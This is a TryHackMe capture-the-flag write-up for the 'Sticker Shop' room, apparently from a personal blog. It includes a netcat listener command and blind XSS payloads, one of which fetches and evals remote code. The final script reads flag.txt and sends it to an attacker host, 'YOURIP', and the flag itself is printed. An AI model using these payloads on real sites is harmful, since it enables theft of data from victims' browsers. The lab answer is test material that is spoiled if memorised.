---
tittle: The Sticker Shop
description: Can you exploit the sticker shop in order to capture the flag?
author: xFraylin
date: 2024-12-12 01:55:00 +0800
categories: [Tryhackme]
tags: [CTF]
image:
    path: https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/port.png?raw=true
---

## Firts Let's start the machine
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/start.jpg?raw=true){:width="1200" heigth"630"}
##  The sticker shop is finally online!
Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!

Can you read the flag at `http://MACHINE_IP:8080/flag.txt`?

>
Can you conduct any client-side exploitation in order to read the flag?
`That is a tryhackme hint, once the machine is started let's go to the machine IP`
{: .prompt-tip }

`As you can see says Unauthorized`
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/go.jpg?raw=true){:width="1200" heigth"630"}

>
After like `15` minues looking for a directory I found one `submit_feedback` so now let's navigate to `http://machine_ip:8080/submit_feedback`
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/dir.jpg?raw=true)
{: .prompt-info }

>
Remember what tryhackme says `client-side exploitation`
Then i started looking for xss payloads, 2 pages help me on this firts 
{: .prompt-info }
1. <https://www.securitum.com/persistent_threats_via_blind_xss.html> and the another is

2. <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md>


I tried some xss payloads, but im gonna put only two
>
So I set a listener on port before start the xss `8080 `
`nc -nlvp 8080`
{: .prompt-tip }
```
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
```
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/try.jpg?raw=true)

> `nc` calls netcat
1. `n` Avoids netcat dns resolution
2. `l` Puts Netcat in listening mode, waiting for incoming  connections.
3. `v` Enables Verbose mode | More details 
4. `p` Specifies the port to listen on
5. `8080` The chosen port number.
{: .prompt-info }

`After like 25 minutes I combined the script found on the web pages that i mencione before then I get this script`


```
'"><script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://YOURIP/?flag=' + encodeURIComponent(data));
    });
</script>
```
![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/flag.jpg?raw=true){:width="1200" heigth"630"}
`THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D`
>
1. `fetch('http://127.0.0.1:8080/flag.txt')` The `fetch` function is used to do a http request to a local server (Like he's on the local machine) `127.0.0.1` in the port `8080`
`fetch('http://127.0.0.1:8080/flag.txt')`, If the flag.txt exists & the servers reply, then the content give us as a response.
2. `.then(response => response.text())` This convert the response in plaintext.
3. `fetch('http://YOURIP/?flag=' + encodeURIComponent(data));` The data obteined  (the `flag.txt`content)  Are sent to a external server controlled by `YOURIP` 
4. encodeURIComponent(data) ensures that special characters in the content do not break the URL.
{: .prompt-info}
>
After that we got the flag , I hope you enjoy this, `IF YOU SEE ANY DRMATICAL ERRORS, excuse me, I'm LEARNING ENGLISH ;)
{: .prompt-tip}

